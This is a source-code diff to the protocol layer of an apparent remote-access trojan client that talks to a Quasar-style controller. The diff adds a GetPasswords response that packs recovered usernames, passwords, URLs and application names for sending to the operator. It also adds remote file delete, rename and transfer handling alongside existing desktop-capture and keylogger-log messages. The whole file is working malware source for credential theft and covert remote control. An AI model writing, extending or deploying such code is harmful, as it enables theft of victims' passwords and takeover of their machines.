@@ -5,6 +5,7 @@
  */
 #include "pch.h"
 #include "remote_protocol.h"
+#include "remote_passwords.h"
 #include "remote_log.h"
 #include <ShlObj.h>
 #include <TlHelp32.h>
@@ -403,21 +404,67 @@ unsigned int remote_proto_encode_get_desktop_response(const unsigned char* image
     return pos + res_len;
 }
 
-/* Parse GetDirectory body: field 1 RemotePath (tag 0x0A, length-delimited string). */
+/* Skip one protobuf field (tag + value). Sets *out_consumed to bytes consumed; returns 1 on success, 0 on error. */
+static int skip_field(const unsigned char* buf, unsigned int buf_len, unsigned int* out_consumed) {
+    if (buf_len < 1 || !out_consumed) { *out_consumed = 0; return 0; }
+    unsigned int wire = buf[0] & 7;
+    if (wire == 0) {
+        unsigned int n = 0;
+        read_varint(buf + 1, buf_len - 1, &n);
+        if (n == 0) return 0;
+        *out_consumed = 1 + n;
+        return 1;
+    }
+    if (wire == 2) {
+        unsigned int n = 0;
+        unsigned int len = read_varint(buf + 1, buf_len - 1, &n);
+        if (n == 0 || 1u + n + len > buf_len) return 0;
+        *out_consumed = 1 + n + len;
+        return 1;
+    }
+    return 0;
+}
+
+/* Parse GetDirectory body: field 1 RemotePath (tag 0x0A, length-delimited string).
+ * If body starts with 0x12 (field 2 length-delimited), unwrap once; inner may be 0x0A+path or raw path bytes. */
 int remote_proto_decode_get_directory(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size) {
     if (!body || !path_buf || path_buf_size == 0) return 0;
     path_buf[0] = '\0';
+    /* Unwrap field 2 (0x12) envelope if present (protobuf-net polymorphic format). */
+    if (body_len >= 3 && body[0] == 0x12) {
+        unsigned int len_consumed = 0;
+        unsigned int inner_len = read_varint(body + 1, body_len - 1, &len_consumed);
+        if (len_consumed > 0 && 1u + len_consumed + inner_len <= body_len) {
+            body = body + 1 + len_consumed;
+            body_len = inner_len;
+        }
+    }
+    /* Some servers send raw path bytes (no 0x0A tag) inside the 0x12 envelope, e.g. "C:\Users". */
+    if (body_len > 0 && body_len < path_buf_size && body[0] != 0x0A && body[0] != 0x12) {
+        unsigned int copy_len = body_len;
+        if (copy_len >= path_buf_size) copy_len = path_buf_size - 1;
+        memcpy(path_buf, body, copy_len);
+        path_buf[copy_len] = '\0';
+        return 1;
+    }
     unsigned int i = 0;
     while (i + 1 < body_len) {
         unsigned char tag = body[i++];
-        if ((tag >> 3) != 1 || (tag & 7) != 2) continue;
-        unsigned int len_consumed = 0;
-        unsigned int len = read_varint(body + i, body_len - i, &len_consumed);
-        if (len_consumed == 0 || i + len_consumed + len > body_len || len >= path_buf_size) return 0;
-        i += len_consumed;
-        memcpy(path_buf, body + i, len);
-        path_buf[len] = '\0';
-        return 1;
+        unsigned int wire = tag & 7;
+        unsigned int field = tag >> 3;
+        if (field == 1 && wire == 2) {
+            unsigned int len_consumed = 0;
+            unsigned int len = read_varint(body + i, body_len - i, &len_consumed);
+            if (len_consumed == 0 || i + len_consumed + len > body_len || len >= path_buf_size) return 0;
+            i += len_consumed;
+            memcpy(path_buf, body + i, len);
+            path_buf[len] = '\0';
+            return 1;
+        }
+        /* Skip this field so we don't mis-parse (e.g. field 1 varint before field 1 string). */
+        unsigned int skip = 0;
+        if (!skip_field(body + i - 1, body_len - (i - 1), &skip)) return 0;
+        i += skip - 1; /* advance past value (we already advanced i past the tag) */
     }
     return 0;
 }
@@ -433,23 +480,99 @@ static unsigned int put_file_system_entry(unsigned char* out, unsigned int out_s
     return pos;
 }
 
+/* Strip leading UTF-8 BOM, control chars, and any leading garbage so path starts with a valid path char (letter, \\, .). */
+static void sanitize_path(char* path, unsigned int path_size) {
+    if (!path || path_size == 0) return;
+    /* Strip UTF-8 BOM (EF BB BF). */
+    if (path_size >= 3 && (unsigned char)path[0] == 0xEF && (unsigned char)path[1] == 0xBB && (unsigned char)path[2] == 0xBF) {
+        memmove(path, path + 3, path_size - 3);
+        path[path_size - 3] = '\0';
+    }
+    /* Strip leading control chars, space, and non-path bytes until we see A-Z, a-z, \\, /, or digit (valid path start). */
+    while (path[0] != '\0') {
+        unsigned char c = (unsigned char)path[0];
+        if (c <= 32) {
+            memmove(path, path + 1, path_size - 1);
+            path[path_size - 1] = '\0';
+            continue;
+        }
+        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '\\' || c == '/' || (c >= '0' && c <= '9'))
+            break;
+        memmove(path, path + 1, path_size - 1);
+        path[path_size - 1] = '\0';
+    }
+    /* Strip trailing control chars and space. */
+    for (size_t i = strlen(path); i > 0; i--) {
+        if ((unsigned char)path[i - 1] <= 32 || path[i - 1] == ' ') {
+            path[i - 1] = '\0';
+        } else {
+            break;
+        }
+    }
+}
+
+/* Public: normalize path for file/dir operations (strip garbage, / -> \). */
+void remote_proto_normalize_path(char* path, unsigned int path_size) {
+    if (!path || path_size == 0) return;
+    sanitize_path(path, path_size);
+    for (unsigned int i = 0; path[i] && i < path_size; i++) {
+        if (path[i] == '/') path[i] = '\\';
+    }
+}
+
+/* Normalize path for FindFirstFileA: replace / with \\, ensure drive root "X:" becomes "X:\". */
+static void normalize_path_for_find(char* path, unsigned int path_size) {
+    if (!path || path_size == 0) return;
+    sanitize_path(path, path_size);
+    for (unsigned int i = 0; path[i] && i < path_size; i++) {
+        if (path[i] == '/') path[i] = '\\';
+    }
+    /* Ensure "X:" has trailing backslash so "X:\*" is valid. */
+    size_t len = strlen(path);
+    if (len == 2 && path[1] == ':' && path[0] != '\0' && (path[0] >= 'A' && path[0] <= 'Z' || path[0] >= 'a' && path[0] <= 'z')) {
+        if (len + 2 <= path_size) {
+            path[2] = '\\';
+            path[3] = '\0';
+        }
+    }
+}
+
 /* GetDirectoryResponse: field 1 RemotePath (string), field 2 Items (repeated FileSystemEntry). Uses FindFirstFileA. */
 unsigned int remote_proto_encode_get_directory_response(const char* remote_path, unsigned char* out, unsigned int out_size) {
     if (!out || !remote_path || out_size < 64) return 0;
     unsigned int pos = 0;
-    pos += put_string(out + pos, out_size - pos, 1, remote_path);
+    char norm_path[MAX_PATH];
+    strncpy_s(norm_path, sizeof(norm_path), remote_path, _TRUNCATE);
+    normalize_path_for_find(norm_path, (unsigned int)sizeof(norm_path));
+    /* Emit normalized path in RemotePath so the server UI doesn't see illegal characters. */
+    pos += put_string(out + pos, out_size - pos, 1, norm_path);
     char search_path[MAX_PATH];
-    _snprintf_s(search_path, sizeof(search_path), _TRUNCATE, "%s\\*", remote_path);
+    {
+        _snprintf_s(search_path, sizeof(search_path), _TRUNCATE, "%s*", norm_path);
+        /* Ensure we have "dir\*" not "dir*" when dir doesn't end with backslash. */
+        if (norm_path[0]) {
+            size_t n = strlen(norm_path);
+            if (n > 0 && norm_path[n - 1] != '\\' && n + 2 < sizeof(search_path)) {
+                search_path[0] = '\0';
+                _snprintf_s(search_path, sizeof(search_path), _TRUNCATE, "%s\\*", norm_path);
+            }
+        }
+    }
     WIN32_FIND_DATAA fd;
     HANDLE h = FindFirstFileA(search_path, &fd);
-    if (h == INVALID_HANDLE_VALUE) return pos;
+    if (h == INVALID_HANDLE_VALUE) {
+        remote_log("[proto] GetDirectory FindFirstFileA failed: path=%s, err=%lu", search_path, (unsigned long)GetLastError());
+        return pos;
+    }
     do {
         if (fd.cFileName[0] == '.' && (fd.cFileName[1] == '\0' || (fd.cFileName[1] == '.' && fd.cFileName[2] == '\0')))
             continue;
+        if (fd.cFileName[0] == '\0') continue; /* skip empty names */
         unsigned char entry_buf[512];
         int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
         unsigned long long sz = is_dir ? 0 : ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
         unsigned int entry_len = put_file_system_entry(entry_buf, sizeof(entry_buf), is_dir, fd.cFileName, sz);
+        if (entry_len == 0) continue; /* e.g. empty name skipped by put_string */
         if (pos + 2 + entry_len > out_size) break;
         out[pos++] = (unsigned char)TAG(2, WIRE_LEN);
         pos += put_varint(entry_len, out + pos);
@@ -466,6 +589,190 @@ unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const cha
     return put_string(out, out_size, 1, logs_directory);
 }
 
+/* RecoveredAccount: field 1 Username, 2 Password, 3 Url, 4 Application. */
+static unsigned int put_recovered_account(const remote_recovered_account_t* a, unsigned char* out, unsigned int out_size) {
+    unsigned int pos = 0;
+    unsigned int n;
+    if (a->username[0]) { n = put_string(out + pos, out_size - pos, 1, a->username); if (n) pos += n; }
+    if (a->password[0]) { n = put_string(out + pos, out_size - pos, 2, a->password); if (n) pos += n; }
+    if (a->url[0]) { n = put_string(out + pos, out_size - pos, 3, a->url); if (n) pos += n; }
+    if (a->application[0]) { n = put_string(out + pos, out_size - pos, 4, a->application); if (n) pos += n; }
+    return pos;
+}
+
+/* GetPasswordsResponse: field 1 repeated RecoveredAccount. */
+unsigned int remote_proto_encode_get_passwords_response(const void* accounts, unsigned int count, unsigned char* out, unsigned int out_size) {
+    if (!out || out_size < 16) return 0;
+    const remote_recovered_account_t* arr = (const remote_recovered_account_t*)accounts;
+    unsigned int pos = 0;
+    for (unsigned int i = 0; i < count && pos + 64 < out_size; i++) {
+        unsigned char entry_buf[4096];
+        unsigned int entry_len = put_recovered_account(&arr[i], entry_buf, sizeof(entry_buf));
+        if (entry_len == 0) continue;
+        if (pos + 2 + entry_len > out_size) break;
+        out[pos++] = (unsigned char)TAG(1, WIRE_LEN);
+        pos += put_varint(entry_len, out + pos);
+        if (pos + entry_len > out_size) break;
+        memcpy(out + pos, entry_buf, entry_len);
+        pos += entry_len;
+    }
+    return pos;
+}
+
+/* Unwrap optional length-delimited outer envelope (protobuf-net polymorphic). */
+static void unwrap_body_once(const unsigned char* body, unsigned int body_len, const unsigned char** out_parse, unsigned int* out_parse_len) {
+    *out_parse = body;
+    *out_parse_len = body_len;
+    if (body_len >= 3) {
+        unsigned int tag_consumed = 0;
+        unsigned int tag_val = read_varint(body, body_len, &tag_consumed);
+        if (tag_consumed > 0 && (tag_val & 7) == 2) {
+            unsigned int len_consumed = 0;
+            unsigned int inner_len = read_varint(body + tag_consumed, body_len - tag_consumed, &len_consumed);
+            if (len_consumed > 0 && inner_len > 0 && tag_consumed + len_consumed + inner_len <= body_len) {
+                *out_parse = body + tag_consumed + len_consumed;
+                *out_parse_len = inner_len;
+            }
+        }
+    }
+}
+
+/* Parse DoPathDelete body: field 1 Path (string), field 2 PathType (varint). FileType: 0=File, 1=Directory. */
+int remote_proto_decode_do_path_delete(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, int* out_path_type) {
+    if (!body || !path_buf || path_buf_size == 0 || !out_path_type) return 0;
+    path_buf[0] = '\0';
+    *out_path_type = 0;
+    const unsigned char* parse = body;
+    unsigned int parse_len = body_len;
+    unwrap_body_once(body, body_len, &parse, &parse_len);
+    unsigned int i = 0;
+    while (i < parse_len) {
+        unsigned char tag = parse[i++];
+        unsigned int field = tag >> 3;
+        unsigned int wire = tag & 7;
+        if (wire == 0) {
+            unsigned int consumed = 0;
+            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
+            if (consumed == 0) break;
+            if (field == 2) *out_path_type = (int)(v == 1 ? 1 : 0); /* 1=Directory, else File */
+            i += consumed;
+            continue;
+        }
+        if (wire != 2) break;
+        unsigned int len_consumed = 0;
+        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
+        if (len_consumed == 0 || i + len_consumed + len > parse_len || len >= path_buf_size) break;
+        i += len_consumed;
+        if (field == 1) {
+            memcpy(path_buf, parse + i, len);
+            path_buf[len] = '\0';
+        }
+        i += len;
+    }
+    return (path_buf[0] != '\0') ? 1 : 0;
+}
+
+/* Parse DoPathRename body: field 1 Path, 2 NewPath, 3 PathType (varint). */
+int remote_proto_decode_do_path_rename(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, char* new_path_buf, unsigned int new_path_buf_size, int* out_path_type) {
+    if (!body || !path_buf || !new_path_buf || !out_path_type) return 0;
+    path_buf[0] = '\0';
+    new_path_buf[0] = '\0';
+    *out_path_type = 0;
+    const unsigned char* parse = body;
+    unsigned int parse_len = body_len;
+    unwrap_body_once(body, body_len, &parse, &parse_len);
+    unsigned int i = 0;
+    while (i < parse_len) {
+        unsigned char tag = parse[i++];
+        unsigned int field = tag >> 3;
+        unsigned int wire = tag & 7;
+        if (wire == 0) {
+            unsigned int consumed = 0;
+            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
+            if (consumed == 0) break;
+            if (field == 3) *out_path_type = (int)(v == 1 ? 1 : 0);
+            i += consumed;
+            continue;
+        }
+        if (wire != 2) break;
+        unsigned int len_consumed = 0;
+        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
+        if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
+        i += len_consumed;
+        if (field == 1 && len < path_buf_size) {
+            memcpy(path_buf, parse + i, len);
+            path_buf[len] = '\0';
+        } else if (field == 2 && len < new_path_buf_size) {
+            memcpy(new_path_buf, parse + i, len);
+            new_path_buf[len] = '\0';
+        }
+        i += len;
+    }
+    return (path_buf[0] != '\0' && new_path_buf[0] != '\0') ? 1 : 0;
+}
+
+/* Parse FileTransferCancel body: field 1 Id (varint), field 2 Reason (string, optional). */
+int remote_proto_decode_file_transfer_cancel(const unsigned char* body, unsigned int body_len, int* out_id, char* reason_buf, unsigned int reason_buf_size) {
+    if (!body || !out_id) return 0;
+    *out_id = 0;
+    if (reason_buf && reason_buf_size) reason_buf[0] = '\0';
+    const unsigned char* parse = body;
+    unsigned int parse_len = body_len;
+    unwrap_body_once(body, body_len, &parse, &parse_len);
+    unsigned int i = 0;
+    while (i < parse_len) {
+        unsigned char tag = parse[i++];
+        unsigned int field = tag >> 3;
+        unsigned int wire = tag & 7;
+        if (wire == 0) {
+            unsigned int consumed = 0;
+            unsigned int v = read_varint(parse + i, parse_len - i, &consumed);
+            if (consumed == 0) break;
+            if (field == 1) *out_id = (int)v;
+            i += consumed;
+            continue;
+        }
+        if (wire != 2) break;
+        unsigned int len_consumed = 0;
+        unsigned int len = read_varint(parse + i, parse_len - i, &len_consumed);
+        if (len_consumed == 0 || i + len_consumed + len > parse_len) break;
+        i += len_consumed;
+        if (field == 2 && reason_buf && reason_buf_size && len < reason_buf_size) {
+            memcpy(reason_buf, parse + i, len);
+            reason_buf[len] = '\0';
+        }
+        i += len;
+    }
+    return 1; /* Id can be 0; caller uses *out_id */
+}
+
+/* Encode SetStatusFileManager: field 1 Message (string), field 2 SetLastDirectorySeen (varint bool). */
+unsigned int remote_proto_encode_set_status_file_manager(const char* message, int set_last_directory_seen, unsigned char* out, unsigned int out_size) {
+    if (!out || out_size < 8) return 0;
+    unsigned int pos = 0;
+    if (message && message[0]) {
+        unsigned int n = put_string(out + pos, out_size - pos, 1, message);
+        if (n == 0) return 0;
+        pos += n;
+    }
+    out[pos++] = (unsigned char)TAG(2, WIRE_VARINT);
+    pos += put_varint(set_last_directory_seen ? 1u : 0u, out + pos);
+    return pos;
+}
+
+/* Encode FileTransferCancel (client sends to server): field 1 Id, field 2 Reason. */
+unsigned int remote_proto_encode_file_transfer_cancel(int id, const char* reason, unsigned char* out, unsigned int out_size) {
+    if (!out || out_size < 8) return 0;
+    unsigned int pos = 0;
+    out[pos++] = (unsigned char)TAG(1, WIRE_VARINT);
+    pos += put_varint((unsigned int)id, out + pos);
+    if (reason && reason[0]) {
+        unsigned int n = put_string(out + pos, out_size - pos, 2, reason);
+        if (n) pos += n;
+    }
+    return pos;
+}
+
 /* Parse FileTransferChunk body when receiving from server. Unwrap field-32 or field-34 if present, then parse Id, FilePath, FileSize, Chunk. */
 int remote_proto_decode_file_transfer_chunk(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size, long long* out_file_size, long long* out_offset, unsigned char* data_buf, unsigned int data_buf_size, unsigned int* out_data_len) {
     if (!body || !out_id || !path_buf || !out_file_size || !out_offset || !data_buf || !out_data_len) return 0;
@@ -479,8 +786,10 @@ int remote_proto_decode_file_transfer_chunk(const unsigned char* body, unsigned 
     if (parse_len >= 3) {
         unsigned int tag_consumed = 0, len_consumed = 0;
         unsigned int tag_val = read_varint(parse, parse_len, &tag_consumed);
-        /* 258 = (32<<3)|2 (field 32), 274 = (34<<3)|2 (field 34) */
-        if (tag_consumed > 0 && tag_consumed < parse_len && (tag_val == 274u || tag_val == 258u)) {
+        /* Some serializers wrap the FileTransferChunk in a length-delimited envelope (e.g. field 32, 33, 34...). */
+        unsigned int env_field = tag_val >> 3;
+        unsigned int env_wire = tag_val & 7;
+        if (tag_consumed > 0 && tag_consumed < parse_len && env_wire == 2 && env_field >= 16u) {
             unsigned int inner_len = read_varint(parse + tag_consumed, parse_len - tag_consumed, &len_consumed);
             if (len_consumed > 0 && inner_len > 0 && tag_consumed + len_consumed + inner_len <= parse_len) {
                 parse = parse + tag_consumed + len_consumed;
